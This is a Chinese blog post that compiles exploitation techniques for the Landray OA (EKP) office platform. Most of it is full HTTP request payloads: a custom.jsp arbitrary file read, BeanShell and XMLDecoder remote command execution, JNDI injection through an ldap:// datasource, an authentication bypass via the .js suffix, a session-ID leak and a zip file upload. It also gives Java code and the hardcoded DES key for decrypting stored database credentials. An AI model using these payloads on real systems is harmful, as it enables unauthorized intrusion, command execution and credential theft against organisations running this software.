#  蓝凌OA漏洞利用总结  
 StudySec   2026-01-08 07:08  
  
**基本介绍:**  
  
蓝凌是国内数字化办公专业服务商, 也是国内知名的大平台OA服务商, 为国内众多中大型组织企业提供数字化办公服务  
。蓝凌OA(EKP) 在近年来爆出许多大大小小的安全漏洞, 也是红蓝队重点关注的OA系统之一, 本文总结了蓝凌OA历史上的前台漏洞和一些后渗透思路, 后续不定期对蓝凌OA的相关历史漏洞进行分析。  
#### 蓝凌OA版本  
  
通过对蓝凌oa各个大版本之间js文件的差异, 可初步判断蓝凌oa版本,  通过对蓝凌OA 系统是否存在某些js静态文件,  
结合其他师傅的分享, 简单判断出如下js文件对应的版本信息:  
```
- 不存在/resource/js/aes.js则为V13

- 存在/resource/js/aes.js 
- 不存在 /resource/js/address.js 则为V14

- 存在/resource/js/address.js 
- 不存在/resource/js/dialog_ding.js 则为V15

- 存在/resource/js/dialog_ding.js则为V16
```  
  
以上仅做参考, 可能部分小版本之间存在差异, 存在以下接口的情况优先通过该接口进行判断。  
```
curl -v https://x.x.x.x/admin.do?method=exportModuleVersion
```  
  
#### 蓝凌OA权限认证  
  
蓝凌oa采用acegi(spring security前身)权限校验框架, 所有的配置信息authentication\spring.xml中, 在配置文件匿名路径中的路径可直接匿名访问. 此外, 路径对应的权限在design.xml中配置, 如果这个path路径没有在design.xml中进行配置, 则不需要权限校验,相当于匿名访问,  (如/sys/ui/extend/varkind/custom.jsp，还有今年的sysUiComponent文件上传, 这些漏洞路径不在匿名路径中,也不在design.xml中)  
。本文仅针对前台能直接利用的漏洞进行总结。  
#### 蓝凌V13  
  
蓝凌V13版本漏洞相对较多, 前台还存在较多的未披露的漏洞, 如前台代码执行, SQL注入,密码逻辑漏洞等  
。本文仅总结已披露的前台能直接利用漏洞  
。  
1. ####  custom.jsp文件读取  
```
POST /ekp/sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host:192.168.1.2:8080
Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-cn
Accept-Encoding: gzip, deflate
Origin: null
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
```  
  
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
    该漏洞通常配合几个后台漏洞进行利用:   
  
    Bsh代码执行:  
```
POST /sys/ui/extend/varkind/custom.jsp  HTTP/1.1
Host: 192.168.1.2:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 143

var={"body":{"file":"/data/sys-common/datajson"}}&s_bean=sysFormulaValidate&script=Runtime.getRuntime().exec("whoami"
```  
  
      
 XmlDecoder反序列化:  
```
POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host: 192.168.1.2:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 328

var={"body":{"file":"/sys/search/sys_search_main/sysSearchMain.do?method=editParam"}}&fdParemNames=11&fdParameters=<java><void class="bsh.Interpreter"><void method="eval"><string>Runtime.getRuntime().exec("calc");</string></void></void></java>
```  
  
        
JDBC反序列化和JNDI注入  
```
POST /ekp/sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host: 192.168.1.2:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=D79BB3CBC025C413692AEC9999FD2755
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
```  
  
  
解密  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMsrpG4PjiaKfyryia1TEwvqNYPQ17CMXtRrlNtR8JzpR274ZxfzvOk8mW3ZCM7J5t0fjaOhoAVcicq4w/640?wx_fmt=png&from=appmsg "")  
  
  
JDBC/JNDI注入  
```
POST /ekp/admin.do HTTP/1.1
Host: 192.168.1.2:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Origin: http://192.168.1.2:8080
Connection: close
Referer: http://192.168.1.2:8080/ekp/admin.do?method=config
Cookie: JSESSIONID=D79BB3CBC025C413692AEC9999FD2755
Content-MD5:ls
cmd:whoami
Content-Type: application/x-www-form-urlencoded
Content-Length: 86

method=testDbConn&datasource=ldap://x.x.x.x/Basic/

```  
  
#### 蓝凌V15/V16  
  
由于蓝凌OA V15/V16 useSuffixPatternMatch默认设置为true, 导致/data/sys-common/dataxml.js可匹配到/data/sys-common/dataxml, js走的是静态资源过滤器, 绕过了蓝凌oa权限校验。  
####  1. 代码执行  
```
POST /data/sys-common/dataxml.js HTTP/1.1
Host: 192.168.1.2:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

s_bean=sysFormulaValidate&script=Runtime.getRuntime().exec("whoami");
```  
  
以下几个接口均存在这个问题:  
```
/data/sys-common/dataxml
/data/sys-common/treexml
/data/sys-common/datajson
```  
####  2. session泄露  
```
POST /api/sys-authentication/loginService/getLoginSessionId.html HTTP/1.1
Host: 192.168.1.2:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

loginName=admin
```  
  
#### 3. sysUiComponent任意文件上传  
```
POST /sys/ui/sys_ui_component/sysUiComponent.do?method=getThemeInfo&s_ajax=true HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Content-Type: multipart/form-data; boundary=---------------------------WebKitFormBoundaryLX0kdyEWjxgO2xJP

-----------------------------WebKitFormBoundaryLX0kdyEWjxgO2xJP
Content-Disposition: form-data; name="file"; filename="sec.zip"
Content-Type: application/x-zip-compressed

zip文件
-----------------------------WebKitFormBoundaryLX0kdyEWjxgO2xJP--
```  
  
  
**蓝凌oa后利用:**  
  
蓝凌OA数据库密码一般在目标服务器的  
ekp\WEB-INF\KmssConfig\kmssconfig.properties文件中, 其使用的加密算法为DES-ECB，密钥为kmssPropertiesKey。文件解密代码如下:  
```
    public static void decryptConf(String filename) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] bytes= Files.readAllBytes(new File(filename).toPath());
        DESEncrypt des = new DESEncrypt("kmssPropertiesKey");
        ByteArrayInputStream byteArrayInputStream= (ByteArrayInputStream)
                des.decrypt(new ByteArrayInputStream(bytes));
        int ch=0;
        byte[] b=new byte[1024];
        while ((ch=byteArrayInputStream.read(b))!=-1){
            baos.write(b,0,ch);
        }
        System.out.println(new String(baos.toByteArray()));
    }

    public static void main(String[] args) throws Exception {
        decryptConf("kmssconfig.properties");
    }
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMsrpG4PjiaKfyryia1TEwvqNYox5sa9iaCPLws1wCzshRvZUWeicTcMyp0DkV577ictw4Gq5btbwT9YDGw/640?wx_fmt=png&from=appmsg "")  
  
蓝凌oa数据库账号表为sys_org_person 密码字段为:fd_password  
。  
  
  
  
  
